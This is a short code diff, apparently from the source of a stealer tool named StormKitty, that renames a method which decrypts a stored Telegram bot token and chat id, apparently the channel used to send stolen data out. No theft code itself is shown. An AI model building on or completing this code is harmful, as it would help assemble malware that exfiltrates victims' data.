@@ -76,7 +76,7 @@ namespace StormKitty
         };
 
         // Decrypt config values
-        public static void Init()
+        public static void DecryptConfig()
         {
             // Decrypt telegram token and telegram chat id
             TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
